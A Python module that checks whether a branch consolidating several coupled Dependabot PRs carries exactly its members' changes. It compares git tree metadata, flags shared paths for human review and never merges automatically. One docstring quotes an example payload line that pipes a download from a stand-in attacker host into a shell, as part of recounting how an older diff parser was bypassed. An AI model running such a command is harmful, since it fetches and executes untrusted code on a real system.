"""Verification helpers for coupled-set consolidation.

When several Dependabot PRs must land together, the consolidation branch is
built by merging each of them into a fresh branch off `origin/main`. The union
check establishes that the resulting tree carries its members' changes and
nothing else: a change no member introduced would be an unreviewed edit riding
along inside an approved one, so this is a security control, not a convenience.

Verification compares tree metadata -- per path, the status, file mode and blob
hash `git diff --raw` reports -- and not the text of a diff. That covers
deletions, creations, renames, mode changes and type changes, none of which
appear among a diff's added lines at all, and it keeps the file a change landed
in part of the comparison rather than discarding it.

One case is deliberately not decided automatically. Where two or more members
touch the same path, the branch's content there is git's three-way merge of
their versions and equals no single member's blob, so no comparison of hashes
can settle it. That path is reported as a `ContestedPath` and the consolidation
is refused for human review. This is the ordinary shape for a family whose
members all edit one workflow file, so those families are surfaced to an
operator rather than opened automatically.
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

_SLUG = re.compile(r"[^a-z0-9.]+")


_NULL_MODE = "000000"
_NULL_SHA = "0" * 40


class RawParseError(ValueError):
    """`git diff --raw -z` output did not have the documented shape.

    Raised rather than skipped. A record this parser cannot account for is a
    record whose change it cannot verify, and silently ignoring it is the
    failure mode this whole module exists to avoid.
    """


@dataclass(frozen=True, repr=False)
class TreeEntry:
    """One path's post-change tree metadata, as git itself computed it.

    ``status`` is the single-letter code with any similarity score dropped
    (``R100`` -> ``R``). The score is a heuristic that varies with what else
    is in the diff, so comparing it would produce mismatches that reflect
    git's rename-detection budget rather than any real difference.

    ``newmode`` and ``newsha`` describe the file *after* the change, which is
    what a consolidation branch must justify. Mode carries the executable bit
    and the symlink type (``120000``), so a ``chmod +x`` or a file swapped for
    a symlink is a different entry by construction -- neither is visible in a
    diff's ``+`` lines at all.
    """

    path: str
    status: str
    newmode: str
    newsha: str

    def __repr__(self) -> str:
        """Render for an operator-facing error message, not for eval().

        These land in the `union mismatch` message a human reads when a
        consolidation is refused, so the path comes first and the blob is
        abbreviated -- the full 40 characters are compared but add nothing
        to a human's reading of *which file* is unaccounted for.
        """
        return (
            f"<{self.status} {self.path} mode={self.newmode} blob={self.newsha[:12]}>"
        )


@dataclass(frozen=True, repr=False)
class ContestedPath:
    """A path changed by more than one member PR.

    The consolidation branch's content for such a path is git's three-way
    merge of several members' versions, so its blob matches no single
    member's blob. That is not evidence of tampering and it is not evidence
    of safety either -- it is simply outside what tree metadata can decide.

    It is reported instead of being reconciled. Reconciling it would mean
    re-deriving the merged content textually, which is the approach this
    module abandoned; asserting it is fine without checking would be a hole
    in exactly the file the members all care about.
    """

    path: str
    members: int

    def __repr__(self) -> str:
        return (
            f"<CONTESTED {self.path}: changed by {self.members} member PRs; "
            "the merged content is no single member's, so tree metadata "
            "cannot verify it -- review this file by hand>"
        )


def parse_raw(raw: str) -> list[TreeEntry]:
    """Parse `git diff --raw -z` output into per-path tree entries.

    The record shape is
    ``:<oldmode> <newmode> <oldsha> <newsha> <status>NUL<path>NUL``, with a
    **second** path field for the ``R`` and ``C`` statuses. Walking fields
    positionally (rather than splitting on newlines) is what makes the ``-z``
    form safe: a path containing a newline, a tab or a quote cannot desync
    the parse, because only NUL separates fields and NUL cannot occur in a
    path.

    A rename expands into two entries -- a deletion of the source path and a
    creation of the destination -- so that the ``R`` form and the
    ``--no-renames`` ``D``+``A`` form produce the same result. Without the
    synthesised source deletion, a file renamed *out* of a protected
    directory would leave no entry at its original path. A copy leaves its
    source untouched, so it expands to the destination entry only.
    """
    fields = raw.split("\0")
    if fields and fields[-1] == "":
        fields.pop()

    entries: list[TreeEntry] = []
    index = 0
    while index < len(fields):
        meta = fields[index]
        if meta.startswith("::"):
            # A combined (multi-parent) raw diff. `A...B` never produces one,
            # so its presence means the command was not the one this module
            # asked for -- refuse rather than guess at the wider record shape.
            raise RawParseError("combined multi-parent raw diffs are not supported")
        if not meta.startswith(":"):
            raise RawParseError(f"expected a ':' metadata field, got {meta!r}")
        parts = meta[1:].split(" ")
        if len(parts) != 5:
            raise RawParseError(f"malformed raw record: {meta!r}")
        _oldmode, newmode, _oldsha, newsha, status = parts
        if not status:
            raise RawParseError(f"raw record has an empty status: {meta!r}")
        code = status[0]

        index += 1
        if index >= len(fields):
            raise RawParseError(f"raw record has no path field: {meta!r}")
        path = fields[index]
        index += 1

        if code in ("R", "C"):
            if index >= len(fields):
                raise RawParseError(
                    f"{code} record for {path!r} has no destination path"
                )
            destination = fields[index]
            index += 1
            if code == "R":
                entries.append(TreeEntry(path, "D", _NULL_MODE, _NULL_SHA))
            entries.append(TreeEntry(destination, code, newmode, newsha))
        else:
            entries.append(TreeEntry(path, code, newmode, newsha))
    return entries


def entries_by_path(raw: str) -> dict[str, TreeEntry]:
    """Index parsed raw entries by path, refusing duplicates.

    `git diff --raw` emits at most one record per path. A repeated path means
    the input is not what it claims to be, and letting one entry silently
    overwrite another would discard a change -- the unsafe direction.
    """
    out: dict[str, TreeEntry] = {}
    for entry in parse_raw(raw):
        if entry.path in out:
            raise RawParseError(f"path appears twice in one raw diff: {entry.path!r}")
        out[entry.path] = entry
    return out


def verify_union(member_raws: list[str], combined_raw: str) -> tuple[bool, set, set]:
    """Check a consolidation branch's tree against its members' trees.

    Takes `git diff --raw -z` output -- not diff text -- for each member PR
    and for the consolidation branch, both against `origin/main`. Returns
    (ok, missing, extra). ``missing`` holds member entries the branch does
    not carry; ``extra`` holds branch entries no member accounts for. Both
    sets contain `TreeEntry` (and, for contested paths, `ContestedPath`)
    objects whose `repr` names the file, because they are rendered into the
    message an operator reads when a consolidation is refused.

    What this verifies, precisely: for every path, that the branch's
    post-change *status, file mode and blob hash* equal those of the one
    member PR that touched it, and that every path a member touched appears.
    Deletions, creations, renames, mode changes and type changes are covered
    by construction, because each is a difference in the metadata git itself
    computed. It cannot be armed by crafted file content: the content only
    ever reaches this function as a hash git derived from it.

    What it does not verify: a path touched by more than one member. The
    merged blob is neither member's, so no comparison of hashes can decide
    it. Such a path is reported as a `ContestedPath` for human review rather
    than reconciled -- see that class, and the module docstring's note on
    what this means for families whose members share a file.

    **Why this is not a text comparison, and must not become one again.**
    This check was previously a set difference over the added `+` lines
    parsed out of unified diff text, by a function called `added_lines`. It
    took four rounds of fixes, and each round closed one way of making a
    payload silently vanish instead of being reported -- the unsafe
    direction, since a dropped addition reads as "nothing extra here":

    1. The `+++ b/path` file header was matched by content prefix, so a line
       of *content* beginning `+++` was skipped as though it were a header.
       `+++curl evil.example | sh` disappeared.
    2. It was then matched by the previous line's content, so a *removed*
       line whose text began with dashes (`---smuggled`, `--- something`)
       armed the header skip and swallowed the addition that followed it.
    3. A hunk-state flag was then used instead, but file content could clear
       it, putting the parser back in header territory mid-hunk.

    Each fix closed one arming trick and left the machine reachable by the
    next, because the arming input was the attacker's own file content. A
    later review then found six more bypasses that were not parser bugs at
    all but consequences of the primitive: deletions, mode changes and
    renames are not `+` lines in the first place, and discarding the path
    let an approved line satisfy the check from the wrong file.

    Comparing metadata git computed deletes the parser and with it the
    entire category. There is no state machine for content to steer, and no
    round five. If a future change needs more resolution than a blob hash
    gives, get it from git -- another plumbing command whose output is
    metadata -- rather than by reading the diff text again.
    """
    combined = entries_by_path(combined_raw)
    members = [entries_by_path(raw) for raw in member_raws]

    owners: dict[str, list[int]] = {}
    for index, member in enumerate(members):
        for path in member:
            owners.setdefault(path, []).append(index)

    contested = {path for path, who in owners.items() if len(who) > 1}

    missing: set = set()
    extra: set = set()

    # One clear signal per contested path, rather than the pile of unmatched
    # member entries and one unexplained branch entry that would otherwise
    # fall out -- those read as an attack, and this is not one.
    for path in contested:
        extra.add(ContestedPath(path, len(owners[path])))

    for path, entry in combined.items():
        if path in contested:
            continue
        who = owners.get(path)
        if who is None:
            # No member PR touched this path at all.
            extra.add(entry)
        elif members[who[0]][path] != entry:
            # The right path, but not the change the member made to it.
            extra.add(entry)
            missing.add(members[who[0]][path])

    for path, who in owners.items():
        if path in contested or path in combined:
            continue
        missing.add(members[who[0]][path])

    return (not missing and not extra, missing, extra)


class InvalidBranchName(ValueError):
    """A family and version did not yield a name git would accept as a ref."""


def _slugify(text: str) -> str:
    """Reduce arbitrary text to characters a git ref component may carry.

    Everything outside ``[a-z0-9.]`` becomes ``-``; the dot survives because
    versions are full of them. The dot is also the only surviving character
    git restricts, so the remaining work is entirely about dots: a run of
    two or more is collapsed (``..`` is rejected anywhere in a ref), and a
    leading or trailing one is stripped (a component may not begin with a
    dot, and a ref may not end with one).
    """
    slug = _SLUG.sub("-", text.lower())
    slug = re.sub(r"\.{2,}", ".", slug)
    return slug.strip("-.")


def _reject_invalid_ref(name: str) -> None:
    """Refuse a branch name `git check-ref-format` would refuse.

    The slugifier above should already make each of these unreachable. This
    is the assertion that it did: a name that reaches `git switch -c` and is
    rejected there fails with git's own message about a ref, several calls
    away from the family and version that produced it, which is a materially
    worse diagnostic than naming the input up front.

    The rules checked are `git check-ref-format`'s, verified against it:
    ``.`` may not start a component, ``..`` may not appear at all, a
    component may not end in ``.lock``, and the name may not end in ``.`` or
    ``/`` or be empty. The name is also required to carry at least one
    alphanumeric: ``dep-consolidate/-`` is a legal ref and a useless one, and
    a family that slugifies to nothing is a caller bug worth surfacing.
    """
    if ".." in name:
        raise InvalidBranchName(f"{name!r} contains '..'")
    if name.endswith(".") or name.endswith("/"):
        raise InvalidBranchName(f"{name!r} ends with {name[-1]!r}")
    for component in name.split("/"):
        if not component:
            raise InvalidBranchName(f"{name!r} has an empty path component")
        if component.startswith("."):
            raise InvalidBranchName(f"{name!r} has a component starting with '.'")
        if component.endswith(".lock"):
            raise InvalidBranchName(f"{name!r} has a component ending in '.lock'")
    if not any(character.isalnum() for character in name.split("/", 1)[1]):
        raise InvalidBranchName(f"{name!r} names no family or version")


def branch_name(family: str, version: str) -> str:
    """Build the consolidation branch name for a family and target version.

    Both ``family`` and ``version`` are slugified. ``version`` legitimately
    carries npm requirement-range markers such as ``^`` or ``~`` (Dependabot
    titles like "Update vitest requirement from ^4.0.16 to ^5.0.0"), and those
    characters are not valid in a git ref, so leaving it unslugified breaks
    branch creation for exactly the coupled-npm case this module exists to
    consolidate.

    Raises `InvalidBranchName` rather than returning something git will
    refuse. The dot is the character that makes this necessary: it is kept
    for versions, and git restricts where it may appear, so a version of
    ``..`` or one ending in ``.`` used to produce a ref that only failed
    later, at `git switch -c`.
    """
    name = f"dep-consolidate/{_slugify(family)}-{_slugify(version)}"
    if name.endswith(".lock"):
        # Only reachable through the join, since each slug has already had
        # its trailing dot stripped: family "a." + version "lock" -> "a-.lock"
        # is not one component ending in ".lock" by accident of either input.
        name = name[: -len(".lock")] + "-lock"
    _reject_invalid_ref(name)
    return name


def families_from_decisions(decisions: list[dict]) -> dict[str, list[int]]:
    """Group coupled decisions by family, in ascending PR order.

    Decisions are read as plain dicts -- the same shape `dep_triage` writes to
    `decisions.json` -- rather than as `Decision` instances, so this module has
    no import dependency on `dep_triage` at all.
    """
    families: dict[str, list[int]] = {}
    for decision in decisions:
        if decision.get("code") != "coupled":
            continue
        family = decision.get("family")
        if not family:
            continue
        families.setdefault(family, []).append(int(decision["number"]))
    return {key: sorted(value) for key, value in families.items()}


def consolidation_body(family: str, version: str, members: list[int]) -> str:
    """Build the consolidated PR body explaining why members cannot merge alone."""
    listed = ", ".join(f"#{number}" for number in sorted(members))
    return (
        f"Consolidates the `{family}` update to {version}.\n\n"
        f"Members: {listed}.\n\n"
        "These cannot be merged individually. The refs must move together, so "
        "merging any one alone leaves the repository inconsistent -- and a "
        "member can pass every check while still being unsafe by itself.\n\n"
        "Before this PR was opened, every path this branch changes was "
        "verified against the member pull requests: for each one, the file "
        "mode and content hash match the member that changed it, and no path "
        "is touched that no member touched.\n\n"
        "Member PRs are left open deliberately: Dependabot retires them once "
        "the version lands, and keeping them open means rejecting this "
        "consolidation does not discard the originals.\n\n"
        "Operator review and merge required. Nothing here was merged or "
        "approved automatically."
    )


def _raw_diff_argv(revs: str) -> list[str]:
    """Build the `git diff` argv whose output the union check consumes.

    `--raw -z` yields the tree metadata compared; `--no-abbrev` yields full
    40-character blob hashes, since git shortens them by a length that
    depends on repository size and could differ between two invocations.

    `--no-renames` is deliberate. Rename detection is a similarity heuristic
    whose result depends on the other files in the diff and which git
    abandons entirely once a diff exceeds `diff.renameLimit`. The same
    change could therefore be reported as `R` in a small member diff and as
    `D`+`A` in the larger combined one, failing the check for a reason that
    has nothing to do with the change. Disabled, every rename is a
    deterministic deletion plus creation on both sides -- and a file moved
    out of a protected directory is still two entries no member explains.
    """
    return ["git", "diff", "--raw", "-z", "--no-abbrev", "--no-renames", revs]


def _render(entries: set) -> str:
    """Format a missing/extra set for the operator-facing failure message."""
    return ", ".join(sorted(repr(entry) for entry in entries))


class CommandFailed(RuntimeError):
    """A subprocess command exited non-zero, timed out, or could not run."""


_TIMEOUT_SECONDS = 300


def _run(
    args: list[str], capture: bool = False, timeout: float = _TIMEOUT_SECONDS
) -> str:
    """Execute a command, raising CommandFailed on a non-zero exit or a hang.

    The timeout is not a tuning knob, it is the difference between one failed
    family and a dead job. `git fetch` and every `gh` call here talk to a
    remote, and a remote that accepts the connection and then stops answering
    leaves `subprocess.run` blocked forever -- with no output, until the CI
    job's own cap kills the run. Every remaining family is then skipped with
    no verdict at all, which is worse than any single failure this module can
    report: an operator sees a timed-out job rather than "family X could not
    be verified".

    A timeout is therefore converted into the same `CommandFailed` every
    other failure raises, so it travels the existing path -- caught by
    `consolidate_family`, reported as a failed family, and the `finally`
    still returns the checkout to `main`.
    """
    try:
        result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        raise CommandFailed(
            f"{' '.join(args)} did not finish within {timeout:g}s and was killed"
        ) from None
    if result.returncode != 0:
        raise CommandFailed(
            f"{' '.join(args)} exited {result.returncode}: {result.stderr.strip()}"
        )
    return result.stdout if capture else ""


def consolidate_family(
    family: str,
    version: str,
    members: list[int],
    run: Callable[..., str] = _run,
) -> tuple[bool, str]:
    """Build a consolidation branch for one family and open its pull request.

    Returns (ok, message). Never merges and never approves anything: the
    consolidated PR goes through the same operator review as any other change.

    The union check is a security control. If the branch's tree differs from
    the union of its members' trees -- an unexplained path, a changed mode, a
    deletion, or a blob no member produced -- an unreviewed change would be
    riding along inside an approved one, so the function refuses to open the
    PR. It also refuses when two members touched the same path, which tree
    metadata cannot decide either way.

    `git`/`gh` calls go through the injected `run` callable rather than calling
    `subprocess` directly, so this orchestration is unit-testable with a fake
    that never touches the network or a real git checkout.

    Every command failure is converted into a returned `(False, message)` rather
    than raised. This component holds write access, so a raised exception is the
    expensive outcome: the branch may already be pushed, and an escape past the
    caller's loop would leave the repository on a consolidation branch and
    silently skip every remaining family. The `finally` returns to `main` on all
    paths for the same reason.
    """
    try:
        branch = branch_name(family, version)
    except InvalidBranchName as exc:
        # Refused before anything is touched, so nothing needs unwinding and
        # the `finally` below is not entered at all.
        return (False, f"family {family}: cannot name a branch for it: {exc}")

    try:
        run(["git", "switch", "-c", branch, "origin/main"])

        member_raws: list[str] = []
        for pr in members:
            run(["git", "fetch", "origin", f"pull/{pr}/head:pr-{pr}"])
            member_raws.append(
                run(_raw_diff_argv(f"origin/main...pr-{pr}"), capture=True)
            )
            try:
                run(["git", "merge", "--no-edit", f"pr-{pr}"])
            except CommandFailed:
                # A merge conflict must not leave the repo on a half-merged
                # branch: abort the in-progress merge before reporting. The
                # return to main is handled by the outer `finally`.
                run(["git", "merge", "--abort"])
                return (False, f"family {family}: PR #{pr} conflicts; skipped")

        if not any(parse_raw(raw) for raw in member_raws):
            return (
                False,
                f"family {family}: no member contributed a change; "
                "refusing to open an empty consolidation",
            )

        combined = run(_raw_diff_argv("origin/main...HEAD"), capture=True)
        ok, missing, extra = verify_union(member_raws, combined)
        if not ok:
            # Sorted by `repr` rather than by the entries themselves: the two
            # sets hold different types, so there is no ordering between a
            # TreeEntry and a ContestedPath. The repr is what an operator
            # reads anyway.
            return (
                False,
                f"family {family}: union mismatch; "
                f"missing=[{_render(missing)}] extra=[{_render(extra)}]",
            )

        run(["git", "push", "-u", "origin", branch, "--force-with-lease"])
        run(
            [
                "gh",
                "pr",
                "create",
                "--base",
                "main",
                "--head",
                branch,
                "--title",
                f"chore(deps): bump {family} to {version} across all refs",
                "--body",
                consolidation_body(family, version, members),
                "--label",
                "dependencies",
                "--label",
                "automated",
            ]
        )
        for pr in members:
            run(
                [
                    "gh",
                    "pr",
                    "comment",
                    str(pr),
                    "--body",
                    f"Superseded by the consolidated PR on `{branch}`; this PR "
                    "cannot be merged on its own.",
                ]
            )
        return (True, f"family {family}: opened {branch}")
    except CommandFailed as exc:
        return (False, f"family {family}: aborted after a command failure: {exc}")
    except RawParseError as exc:
        # Unparsable tree metadata means the union check cannot run, and a
        # check that cannot run must not be treated as a check that passed.
        return (False, f"family {family}: unreadable raw diff: {exc}")
    finally:
        # Return to main on every path, including the failure paths above. A
        # failure that left the repository on a consolidation branch would
        # make the next family in the loop branch from the wrong base.
        try:
            run(["git", "switch", "main"])
        except CommandFailed:
            pass


def main(argv: list[str] | None = None) -> int:
    """Open one consolidated PR per coupled family.

    Without `--execute`, the plan is printed and nothing is changed -- that
    dry-run default is a safety property: the workflow can be exercised (or a
    developer can sanity-check its output locally) without ever touching git
    remotes or opening a pull request.
    """
    parser = argparse.ArgumentParser(
        description="Open consolidated PRs for coupled Dependabot families."
    )
    parser.add_argument(
        "--decisions",
        type=Path,
        required=True,
        help="decisions.json written by dep_triage.",
    )
    parser.add_argument(
        "--snapshot",
        type=Path,
        required=True,
        help="snapshot.json, used for target versions.",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Actually create branches and PRs. Without it, "
        "the plan is printed and nothing is changed.",
    )
    args = parser.parse_args(argv)

    decisions = json.loads(args.decisions.read_text(encoding="utf-8"))["decisions"]
    snapshot = json.loads(args.snapshot.read_text(encoding="utf-8"))
    versions = {
        pr["number"]: pr.get("to_version", "") for pr in snapshot["pull_requests"]
    }

    families = families_from_decisions(decisions)
    any_failed = False
    for family, members in sorted(families.items()):
        if len(members) < 2:
            continue
        target = next((versions[m] for m in members if versions.get(m)), "")
        if not args.execute:
            print(f"would consolidate {family} -> {target}: {members}")
            continue
        ok, message = consolidate_family(family, target, members)
        print(message)
        if not ok:
            # The union check is a security control: an unreviewed line
            # riding along inside an approved consolidation. A ::warning::
            # is easy to miss on a manually dispatched run, so a failed
            # family is reported as an error and fails the job.
            print(f"::error::{message}")
            any_failed = True
    return 1 if any_failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
